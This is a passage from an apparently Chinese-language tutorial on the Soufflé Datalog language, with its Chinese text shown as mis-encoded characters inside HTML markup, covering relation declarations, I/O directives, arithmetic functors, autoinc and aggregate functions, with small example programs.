è¿™ä¹Ÿæ˜¯å¤‡æ³¨ */</code></li></ul><p>C é¢„å¤„ç†å™¨å¤„ç†æ¥è‡ª SoufflÃ© çš„è¾“å…¥ï¼ˆå³å¯ä»¥ä½¿ç”¨å®ï¼‰ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;myprog.dl&quot;</span><br><span class="line">#define MYPLUS(a,b) (a+b)</span><br></pre></td></tr></table></figure><h2 id="ä¾‹2ï¼šå…³ç³»"><a href="#ä¾‹2ï¼šå…³ç³»" class="headerlink" title="ä¾‹2ï¼šå…³ç³»"></a>ä¾‹2ï¼šå…³ç³»</h2><h3 id="å…³ç³»å®šä¹‰"><a href="#å…³ç³»å®šä¹‰" class="headerlink" title="å…³ç³»å®šä¹‰"></a>å…³ç³»å®šä¹‰</h3><p>å…³ç³»å¿…é¡»å£°æ˜åæ‰èƒ½ä½¿ç”¨ï¼Œåœ¨ SoufflÃ© ä»£ç ä¸­ç¼–å†™ä»£ç è¡Œçš„é¡ºåºä¸ä¼šå½±å“ç¨‹åºçš„æ­£ç¡®æ€§ã€‚ä½¿ç”¨ä¸¤ä¸ªå­—æ®µ a å’Œ b å£°æ˜å…³ç³» <code>edge</code>ï¼Œæ¯ä¸ªå­—æ®µéƒ½æ˜¯ç¬¦å·ï¼ˆå­—ç¬¦ä¸²ï¼‰ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.decl edge(a:symbol, b:symbol)</span><br></pre></td></tr></table></figure><h3 id="I-O-æŒ‡ä»¤"><a href="#I-O-æŒ‡ä»¤" class="headerlink" title="I/O æŒ‡ä»¤"></a>I/O æŒ‡ä»¤</h3><p>ç”¨æˆ·å¯ä»¥æŒ‡å®šç”¨äºåŠ è½½è¾“å…¥å’Œå°†è¾“å‡ºå†™å…¥æ–‡ä»¶çš„æŒ‡ä»¤ï¼š</p><ul><li>è¾“å…¥æŒ‡ä»¤ <code>.input &lt;relation-name&gt;</code> ä» <code>&lt;relation-name&gt;.facts</code> è¯»å–ï¼Œé»˜è®¤æƒ…å†µä¸‹ç”±åˆ¶è¡¨ç¬¦åˆ†éš”</li><li>è¾“å‡ºæŒ‡ä»¤ <code>.output &lt;relation-name&gt;</code> å†™å…¥æ–‡ä»¶ï¼Œé€šå¸¸æ˜¯ <code>&lt;relation-name&gt;.csv</code>ï¼ˆé»˜è®¤ï¼‰æˆ– stdoutï¼ˆå–å†³äºé€‰é¡¹ï¼‰</li><li>æ‰“å°å…³ç³»å¤§å°æŒ‡ä»¤ <code>.printsize &lt;relation-name&gt;</code> å°†ç»™å®šå…³ç³»çš„åŸºæ•°ï¼ˆcardinalityï¼‰æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºã€‚</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(n: symbol)</span><br><span class="line">.input <span class="symbol">A</span> // facts are read from file <span class="symbol">A</span>.facts</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">B</span>(n: symbol)</span><br><span class="line"><span class="symbol">B</span>(n) :- <span class="symbol">A</span>(n).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">C</span>(n: symbol)</span><br><span class="line">.output <span class="symbol">C</span> // output appears in <span class="symbol">C</span>.csv</span><br><span class="line"><span class="symbol">C</span>(n) :- <span class="symbol">B</span>(n).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">D</span>(n: symbol)</span><br><span class="line">.printsize <span class="symbol">D</span> // the number of facts in <span class="symbol">D</span> is printed</span><br><span class="line"><span class="symbol">D</span>(n) :- <span class="symbol">C</span>(n).</span><br></pre></td></tr></table></figure><p>å…³ç³»å¯ä»¥ä»ä»¥ä¸‹æ–‡ä»¶åŠ è½½æˆ–å†™å…¥ä»¥ä¸‹æ–‡ä»¶ï¼š</p><ul><li>ä»»æ„ CSV æ–‡ä»¶</li><li>å‹ç¼©çš„æ–‡æœ¬æ–‡ä»¶</li><li>SQLite3 æ•°æ®åº“</li></ul><p>ä¾‹å¦‚ï¼Œè¦å°†è¯„ä¼°åçš„å…³ç³»å­˜å‚¨åˆ° SQLite3 æ•°æ®åº“ä¸­ï¼Œç”¨æˆ·å¯ä»¥æŒ‡å®šå¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(a:number, b:number)</span><br><span class="line">.output <span class="symbol">A</span>(<span class="symbol">IO</span>=sqlite, dbname=<span class="string">&quot;path/to/sqlite3db&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h3><p>Datalog ä¸­çš„ç›®æ ‡æ˜¯å½¢å¼ä¸º <code>false &lt;= p</code> çš„é€»è¾‘å…³ç³»ï¼Œå…¶ä¸­ <code>p</code> æ˜¯é€»è¾‘å…³ç³»ã€‚åœ¨ SoufflÃ© ä¸­ç›®æ ‡æ˜¯ç”±è¾“å‡ºæŒ‡ä»¤æ¨¡æ‹Ÿçš„ï¼Œä¼˜ç‚¹æ˜¯å¯ä»¥åœ¨ä¸€æ¬¡ SoufflÃ© ç¨‹åºçš„æ‰§è¡Œä¸­è¯„ä¼°å¤šä¸ªç‹¬ç«‹çš„ç›®æ ‡ã€‚</p><h3 id="è¯­æ³•ä¾¿åˆ©"><a href="#è¯­æ³•ä¾¿åˆ©" class="headerlink" title="è¯­æ³•ä¾¿åˆ©"></a>è¯­æ³•ä¾¿åˆ©</h3><p>å¯ä»¥ç¼–å†™å…·æœ‰å¤šä¸ªå¤´çš„è§„åˆ™ï¼Œè¿™æ˜¯ä¸€ç§è¯­æ³•ç³–ï¼Œå¯ä»¥æœ€å¤§é™åº¦åœ°å‡å°‘ç¼–ç å·¥ä½œã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªåˆ©ç”¨æ­¤åŠŸèƒ½çš„ä»£ç ç‰‡æ®µä»¥åŠæœªåº”ç”¨è½¬æ¢çš„ç­‰æ•ˆä»£ç ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// <span class="symbol">Multiple</span> heads</span><br><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>). <span class="symbol">A</span>(<span class="number">2</span>). <span class="symbol">A</span>(<span class="number">3</span>).</span><br><span class="line">.decl <span class="symbol">B</span>(x:number)</span><br><span class="line">.decl <span class="symbol">C</span>(x:number)</span><br><span class="line"><span class="symbol">B</span>(x), <span class="symbol">C</span>(x) :- <span class="symbol">A</span>(x).     // åŒæ—¶å®šä¹‰</span><br><span class="line">.output <span class="symbol">B</span>,<span class="symbol">C</span></span><br><span class="line"></span><br><span class="line">// <span class="symbol">Single</span> head</span><br><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>). <span class="symbol">A</span>(<span class="number">2</span>). <span class="symbol">A</span>(<span class="number">3</span>).</span><br><span class="line">.decl <span class="symbol">B</span>(x:number)</span><br><span class="line"><span class="symbol">B</span>(x) :- <span class="symbol">A</span>(x).</span><br><span class="line">.decl <span class="symbol">C</span>(x:number)</span><br><span class="line"><span class="symbol">C</span>(x) :- <span class="symbol">A</span>(x).</span><br><span class="line">.output <span class="symbol">B</span>,<span class="symbol">C</span></span><br></pre></td></tr></table></figure><p>ç±»ä¼¼åœ°ï¼Œè§„åˆ™ä½“ä¸­çš„æå–ï¼ˆdisjunctionsï¼‰ä¹Ÿå¯ä»¥ä½œä¸ºè¯­æ³•ç³–ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// <span class="symbol">Disjunction</span> in rule bodies</span><br><span class="line">.decl edge(x:number, y:number)</span><br><span class="line">edge(<span class="number">1</span>,<span class="number">2</span>). edge(<span class="number">2</span>,<span class="number">3</span>).</span><br><span class="line">.decl path(x:number, y:number)</span><br><span class="line">path(x,y) :-</span><br><span class="line">  edge(x,y);        // æˆ–</span><br><span class="line">  edge(x,q), path(q,y).</span><br><span class="line">.output path</span><br><span class="line"></span><br><span class="line">// <span class="symbol">No</span> disjunction in rule bodies</span><br><span class="line">.decl edge(x:number, y:number)</span><br><span class="line">edge(<span class="number">1</span>,<span class="number">2</span>). edge(<span class="number">2</span>,<span class="number">3</span>).</span><br><span class="line">.decl path(x:number, y:number)</span><br><span class="line">path(x,y) :- edge(x,y).</span><br><span class="line">path(x,y) :- edge(x,q), path(q,y).</span><br></pre></td></tr></table></figure><h2 id="ä¾‹3ï¼šå±æ€§çš„ç±»å‹ç³»ç»Ÿ"><a href="#ä¾‹3ï¼šå±æ€§çš„ç±»å‹ç³»ç»Ÿ" class="headerlink" title="ä¾‹3ï¼šå±æ€§çš„ç±»å‹ç³»ç»Ÿ"></a>ä¾‹3ï¼šå±æ€§çš„ç±»å‹ç³»ç»Ÿ</h2><p>SoufflÃ© çš„ç±»å‹ç³»ç»Ÿæ˜¯é™æ€çš„ï¼Œå°±åƒ C ä¹‹ç±»çš„è¯­è¨€ä¸€æ ·ï¼Œè€Œä¸ Python ä¹‹ç±»çš„è¯­è¨€ä¸åŒã€‚å¿…é¡»åœ¨ç¼–è¯‘ï¼ˆæˆ–è§£é‡Šï¼‰ä¹‹å‰å®šä¹‰å…³ç³»çš„å±æ€§ï¼Œå¹¶åœ¨ç¼–è¯‘æ—¶æ£€æŸ¥ç±»å‹ã€‚è®©ç¨‹åºå‘˜æ¸…æ¥šåœ°äº†è§£å…³ç³»çš„å®šä¹‰åŠå…¶ç”¨æ³•ï¼Œåœ¨è¿è¡Œæ—¶ä¸è¿›è¡ŒåŠ¨æ€æ£€æŸ¥èƒ½å¤Ÿæœ€å¤§é™åº¦åœ°å‡å°‘è¯„ä¼°æ—¶é—´ã€‚</p><h3 id="åŸå­ç±»å‹"><a href="#åŸå­ç±»å‹" class="headerlink" title="åŸå­ç±»å‹"></a>åŸå­ç±»å‹</h3><p>SoufflÃ© æœ‰ä¸¤ç§åŸºæœ¬ç±»å‹ï¼Œç¬¦å·ç±»å‹ <code>symbol</code> å’Œæ•°å­—ç±»å‹ <code>number</code>ã€‚ç¬¦å·ç±»å‹åŒ…å«æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œåœ¨å†…éƒ¨ç”±ä¸€ä¸ªåºæ•°ï¼ˆordinal numberï¼‰è¡¨ç¤ºã€‚å€¼ <code>ord(&quot;hello&quot;)</code> å¯¹åº”äºç»™å®šç¨‹åºçš„è¿™ä¸ªåºæ•°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æ˜¯å­—ç¬¦ä¸² â€œhelloâ€ã€‚æ•°å­—ç±»å‹åŒ…æ‹¬æ‰€æœ‰æ•°å­—çš„å…¨åŸŸã€‚</p><h2 id="ä¾‹4ï¼šç®—æœ¯è¡¨è¾¾å¼"><a href="#ä¾‹4ï¼šç®—æœ¯è¡¨è¾¾å¼" class="headerlink" title="ä¾‹4ï¼šç®—æœ¯è¡¨è¾¾å¼"></a>ä¾‹4ï¼šç®—æœ¯è¡¨è¾¾å¼</h2><p>SoufflÃ© å…è®¸ç®—æœ¯å‡½å­ï¼Œæ‰©å±•äº†ä¼ ç»Ÿçš„ Datalog è¯­ä¹‰ï¼Œå‡½å­ä¸­çš„å˜é‡å¯èƒ½ä¸åŒ…å«ä»»ä½•è‡ªç”±å˜é‡ã€‚ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œæœ€åä¸€è¡Œè¿æ¥ä¸­çš„ç¬¬äºŒä¸ªæ¡ä»¶è°ƒç”¨äº†ç®—æœ¯è¿ç®—ç¬¦ <code>&lt;</code>ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(n: number)</span><br><span class="line">.output <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>).</span><br><span class="line"><span class="symbol">A</span>(x+<span class="number">1</span>) :- <span class="symbol">A</span>(x), x &lt; <span class="number">9.</span>  // å½“ x å°äº <span class="number">9</span> æ—¶</span><br></pre></td></tr></table></figure><p>æ‰“å°æ–æ³¢é‚£å¥‘æ•°åˆ—ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Fib</span>(i:number, a:number)</span><br><span class="line">.output <span class="symbol">Fib</span></span><br><span class="line"><span class="symbol">Fib</span>(<span class="number">1</span>, <span class="number">1</span>).</span><br><span class="line"><span class="symbol">Fib</span>(<span class="number">2</span>, <span class="number">1</span>).</span><br><span class="line"><span class="symbol">Fib</span>(i + <span class="number">1</span>, a + b) :- <span class="symbol">Fib</span>(i, a), <span class="symbol">Fib</span>(i<span class="number">-1</span>, b), i &lt; <span class="number">10.</span></span><br></pre></td></tr></table></figure><p>SoufflÃ© ä¸­å…è®¸ä½¿ç”¨ä»¥ä¸‹ç®—æœ¯å‡½å­ï¼š</p><ul><li>åŠ æ³•ï¼š<code>x + y</code></li><li>å‡æ³•ï¼š<code>x - y</code></li><li>é™¤æ³•ï¼š<code>x / y</code></li><li>ä¹˜æ³•ï¼š<code>x * y</code></li><li>æ¨¡æ•°ï¼š<code>a % b</code></li><li>å¹‚ï¼š<code>a ^ b</code></li><li>è®¡æ•°å™¨ï¼š<code>autoinc()</code></li><li>ä½æ“ä½œï¼š<code>x band y</code>ã€<code>x bor y</code>ã€<code>x bxor y</code> å’Œ <code>bnot x</code></li><li>é€»è¾‘è¿ç®—ï¼š<code>x land y</code>ã€<code>x lor y</code> å’Œ <code>lnot x</code></li></ul><p>SoufflÃ© ä¸­å…è®¸ä»¥ä¸‹ç®—æœ¯çº¦æŸï¼š</p><ul><li>å°äºï¼š<code>a &lt; b</code></li><li>å°äºæˆ–ç­‰äºï¼š<code>a &lt;= b</code></li><li>ç­‰äºï¼š<code>a = b</code></li><li>ä¸ç­‰äºï¼š<code>a != b</code></li><li>å¤§äºæˆ–ç­‰äºï¼š<code>a &gt;= b</code></li><li>å¤§äºï¼š<code>a &gt; b</code></li></ul><p>åœ¨æºç ä¸­ï¼Œæ•°å­—å¯ä»¥å†™æˆåè¿›åˆ¶ã€äºŒè¿›åˆ¶å’Œåå…­è¿›åˆ¶ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">4711</span>).</span><br><span class="line"><span class="symbol">A</span>(<span class="number">0</span>b101).</span><br><span class="line"><span class="symbol">A</span>(<span class="number">0xaffe</span>).</span><br></pre></td></tr></table></figure><h3 id="æ•°å­—ç¼–ç "><a href="#æ•°å­—ç¼–ç " class="headerlink" title="æ•°å­—ç¼–ç "></a>æ•°å­—ç¼–ç </h3><p>æ•°å­—å¯ä»¥ç”¨ä½œé€»è¾‘å€¼ï¼Œå¦‚åœ¨ C ä¸­ï¼š</p><ul><li><code>0</code> ä»£è¡¨å‡</li><li><code>!= 0</code> ä»£è¡¨çœŸ</li></ul><p>å› æ­¤ï¼Œå®ƒä»¬å¯ç”¨äºé€»è¾‘è¿ç®— <code>xland y</code>ã€<code>x lor y</code> å’Œ <code>lnot x</code>ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:number)</span><br><span class="line">.output <span class="symbol">A</span></span><br><span class="line"><span class="symbol">A</span>(<span class="number">0</span> lor <span class="number">1</span>).</span><br></pre></td></tr></table></figure><h3 id="å‡½å­-autoinc"><a href="#å‡½å­-autoinc" class="headerlink" title="å‡½å­ autoinc()"></a>å‡½å­ autoinc()</h3><p>å‡½å­ <code>autoinc()</code> åœ¨æ¯æ¬¡æ±‚å€¼æ—¶éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°æ•°å­—ï¼Œä½†æ˜¯ä¸å…è®¸åœ¨é€’å½’å…³ç³»ä¸­ä½¿ç”¨ã€‚å¯ç”¨äºä¸ºç¬¦å·åˆ›å»ºå”¯ä¸€ç¼–å·ï¼ˆå……å½“æ ‡è¯†ç¬¦ï¼‰ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x: symbol)</span><br><span class="line"><span class="symbol">A</span>(â€œaâ€). <span class="symbol">A</span>(â€œbâ€). <span class="symbol">A</span>(â€œcâ€). <span class="symbol">A</span>(â€œdâ€).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">B</span>(x: symbol, y: number)</span><br><span class="line">.output <span class="symbol">B</span></span><br><span class="line"><span class="symbol">B</span>(x, autoinc()) :- <span class="symbol">A</span>(x).    // ä¸º aã€bã€cã€d å„ç”Ÿæˆä¸€ä¸ªæ ‡è¯†ç¬¦</span><br></pre></td></tr></table></figure><p>ç»™å®šä¸€ä¸ªé›†åˆ <code>A(x:symbol)</code>ï¼Œåˆ›å»ºä¸€ä¸ªåç»§å…³ç³» <code>Succ(x:symbol, y:symbol)</code> ä½¿å¾—ç¬¬ä¸€ä¸ªå‚æ•°åŒ…å« A ä¸­çš„å…ƒç´  xï¼Œç¬¬äºŒä¸ªå‚æ•°åŒ…å« x çš„åç»§ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ª A çš„å…ƒç´ ã€‚<br>ä¾‹å¦‚ï¼Œé›†åˆ <code>A = &#123;&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;&#125;</code> å…·æœ‰åç»§å…³ç³» <code>Succ=((&quot;a&quot;, &quot;b&quot;), (&quot;b&quot;, &quot;c&quot;), (&quot;c&quot;, &quot;d&quot;)&#125;</code>ã€‚å‡è®¾ä¸€ä¸ªå…ƒç´ ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹æ˜¯ä¸€ä¸ªç¬¦å·ï¼‰çš„æ€»é¡ºåºæ ¹æ®å®ƒçš„åºæ•°è®¡ç®—ï¼Œå†…éƒ¨è¡¨ç¤ºä¸ºä¸€ä¸ªæ•°å­—ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(x:symbol) input         // é›†åˆ</span><br><span class="line">.decl <span class="symbol">Less</span>(x:symbol, y:symbol)</span><br><span class="line"><span class="symbol">Less</span>(x,y) :- <span class="symbol">A</span>(x), <span class="symbol">A</span>(y), ord(x) &lt; ord(y).   // æ’åºå…³ç³»ï¼šx &lt; y</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Transitive</span>(x:symbol, y:symbol)</span><br><span class="line"><span class="symbol">Transitive</span>(x,z) :- <span class="symbol">Less</span>(x,y), <span class="symbol">Less</span>(y,z).    // ä¼ é€’å…³ç³»ï¼šx &lt; y &amp;&amp; y &lt; z =&gt; (x, z)</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Succ</span>(x:symbol, y:symbol)</span><br><span class="line"><span class="symbol">Succ</span>(x,y) :- <span class="symbol">Less</span>(x,y), !<span class="symbol">Transitive</span>(x,y).   // åç»§å…³ç³»ï¼šx &lt; y &amp;&amp; ä¸å­˜åœ¨ä¼ é€’å…³ç³»</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">Less</span>, <span class="symbol">Transitive</span>, <span class="symbol">Succ</span></span><br></pre></td></tr></table></figure><p>è®¡ç®—åç»§å…³ç³»çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå…ƒç´ ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">First</span>(x: symbol) output</span><br><span class="line"><span class="symbol">First</span>(x) :- <span class="symbol">A</span>(x), !<span class="symbol">Succ</span>(<span class="symbol">_</span>, x).  // æ²¡æœ‰å‰é©±</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Last</span>(x: symbol) output</span><br><span class="line"><span class="symbol">Last</span>(x) :- <span class="symbol">A</span>(x), !<span class="symbol">Succ</span>(x, <span class="symbol">_</span>).   // æ²¡æœ‰åç»§</span><br></pre></td></tr></table></figure><h2 id="ä¾‹5ï¼šèšåˆ"><a href="#ä¾‹5ï¼šèšåˆ" class="headerlink" title="ä¾‹5ï¼šèšåˆ"></a>ä¾‹5ï¼šèšåˆ</h2><p>SoufflÃ© ä¸­çš„èšåˆæ˜¯æŒ‡ä½¿ç”¨ç‰¹å®šçš„å‡½å­æ¥æ±‡æ€»æœ‰å…³æŸ¥è¯¢çš„ä¿¡æ¯ï¼Œèšåˆç±»å‹åŒ…æ‹¬è®¡æ•°ã€æ±‚æœ€å°å€¼/æœ€å¤§å€¼ã€æ±‚å’Œã€‚åœ¨ SoufflÃ© ä¸­ï¼Œä¿¡æ¯é€šå¸¸ä¸èƒ½ä»å­ç›®æ ‡ï¼ˆèšåˆå‡½å­çš„å‚æ•°ï¼‰æµåˆ°å¤–éƒ¨ä½œç”¨åŸŸã€‚ä¾‹å¦‚ï¼Œå¦‚æœå¸Œæœ›æ‰¾åˆ°å…³ç³» Cost(x) çš„æœ€å°å€¼ï¼Œæ— æ³•æ‰¾åˆ°ä½¿æˆæœ¬æœ€å°åŒ–çš„ç‰¹å®š x å€¼ï¼Œå› ä¸ºè¿™æ ·çš„ x å€¼å¯èƒ½ä¸æ˜¯å”¯ä¸€çš„ã€‚</p><h3 id="è®¡æ•°"><a href="#è®¡æ•°" class="headerlink" title="è®¡æ•°"></a>è®¡æ•°</h3><p>è®¡æ•°å‡½å­ç”¨äºè®¡ç®—å­ç›®æ ‡çš„é›†åˆå¤§å°ï¼Œè¯­æ³•ä¸º <code>count:&#123;&lt;sub-goal&gt;&#125;</code>ã€‚</p><p>ä»¥ä¸‹ç¤ºä¾‹è¾“å‡ºâ€œè“è‰²â€æ±½è½¦çš„æ•°é‡ï¼Œå³ Car ä¸­ç¬¬äºŒä¸ªå‚æ•°ä¸ºâ€œè“è‰²â€çš„å…ƒç´ æ•°é‡ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Car</span>(name: symbol, colour:symbol)</span><br><span class="line"><span class="symbol">Car</span>(<span class="string">&quot;Audi&quot;</span>, <span class="string">&quot;blue&quot;</span>).</span><br><span class="line"><span class="symbol">Car</span>(<span class="string">&quot;VW&quot;</span>, <span class="string">&quot;red&quot;</span>).</span><br><span class="line"><span class="symbol">Car</span>(<span class="string">&quot;BMW&quot;</span>, <span class="string">&quot;blue&quot;</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">BlueCarCount</span>(x: number)</span><br><span class="line"><span class="symbol">BlueCarCount</span>(c) :- c = count:&#123;<span class="symbol">Car</span>(<span class="symbol">_</span>, <span class="string">&quot;blue&quot;</span>)&#125;.</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">BlueCarCount</span></span><br></pre></td></tr></table></figure><h3 id="æœ€å¤§å€¼-æœ€å°å€¼-æ±‚å’Œ"><a href="#æœ€å¤§å€¼-æœ€å°å€¼-æ±‚å’Œ" class="headerlink" title="æœ€å¤§å€¼/æœ€å°å€¼/æ±‚å’Œ"></a>æœ€å¤§å€¼/æœ€å°å€¼/æ±‚å’Œ</h3><p>max å‡½å­è¾“å‡ºé›†åˆçš„æœ€å¤§å€¼ï¼Œè¯­æ³•ä¸º <code>max &lt;var&gt;:&#123;&lt;sub-goal(&lt;var&gt;)&gt;&#125;</code>ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(n:number)</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>). <span class="symbol">A</span>(<span class="number">10</span>). <span class="symbol">A</span>(<span class="number">100</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">MaxA</span>(x: number)</span><br><span class="line"><span class="symbol">MaxA</span>(y) :- y = max x:&#123;<span class="symbol">A</span>(x)&#125;.</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">MaxA</span></span><br></pre></td></tr></table></figure><p>æœ€å°å€¼è¯­æ³•ä¸º <code>min &lt;var&gt;:&#123;&lt;sub-goal&gt;(&lt;var&gt;)&gt;&#125;</code>ï¼›æ±‚å’Œè¯­æ³•ä¸º <code>sum &lt;var&gt;:&#123;&lt;sub-goal&gt;(&lt;var&gt;)&gt;&#125;</code>ã€‚</p><h1 id="Souffle-ç¨‹åº"><a href="#Souffle-ç¨‹åº" class="headerlink" title="SoufflÃ© ç¨‹åº"></a>SoufflÃ© ç¨‹åº</h1><p>ä¸»è¦æ•´ç† Doop ä¸­ç”¨åˆ°çš„ä¸€äº›å†…å®¹ï¼ŒåŒ…æ‹¬åŸºæœ¬çš„å…³ç³»ã€ç±»å‹ã€è§„åˆ™ï¼Œä»¥åŠè¿›é˜¶çš„è‡ªå®šä¹‰å‡½å­ã€ç»„ä»¶ã€ç¼–è¯‘æŒ‡ä»¤ã€‚ï¼ˆè¿™ä¸æ˜¯å…¨åŒ…å«äº†å—ğŸ˜…ï¼‰</p><ul><li>è¯­è¨€ï¼ˆLanguageï¼‰</li><li>å…³ç³»ï¼ˆRelationsï¼‰</li><li>ç±»å‹ï¼ˆTypesï¼‰</li><li>è§„åˆ™ï¼ˆRulesï¼‰</li><li>ç»„ä»¶ï¼ˆComponentsï¼‰</li><li>ç”¨æˆ·å®šä¹‰å‡½å­ï¼ˆUser-Defined Functorsï¼‰</li><li>ç¼–è¯‘æŒ‡ä»¤ï¼ˆPragmaï¼‰</li></ul><h2 id="ç»„æˆ"><a href="#ç»„æˆ" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h2><h3 id="è¯­è¨€"><a href="#è¯­è¨€" class="headerlink" title="è¯­è¨€"></a>è¯­è¨€</h3><p>SoufflÃ© ä¸­çš„ä¸»è¦è¯­è¨€å…ƒç´ æ˜¯å…³ç³»å£°æ˜ï¼ˆrelation declarationsï¼‰ã€äº‹å®ï¼ˆfactsï¼‰ã€è§„åˆ™ï¼ˆrulesï¼‰å’ŒæŒ‡ä»¤ï¼ˆdirectivesï¼‰ã€‚</p><p>ä¾‹å¦‚ï¼Œä»¥ä¸‹ç¨‹åºä¸­åŒ…å«ä¸¤ä¸ªå…³ç³» A å’Œ Bï¼Œå…³ç³»å¿…é¡»å£°æ˜ï¼ˆä»¥ä¾¿ç¼–è¯‘æ—¶æ£€æŸ¥å±æ€§çš„ä½¿ç”¨ï¼‰ï¼›å…³ç³» A æœ‰ä¸¤ä¸ªäº‹å®ï¼š<code>A(1,2).</code> å’Œ <code>A(2,3).</code>ï¼Œäº‹å®æ˜¯æ— æ¡ä»¶æˆç«‹çš„è§„åˆ™ï¼Œå³äº‹å®æ˜¯ Horn Clause <code>A(1,2) â‡ true</code>ï¼›å…³ç³» B æœ‰ä¸¤ä¸ªè§„åˆ™ï¼š<code>B(x,y) :- A(x,y).</code> å’Œ <code>B(x,z) :- A(x,y), B(y,z).</code>ï¼Œè¡¨ç¤º Horn Clause 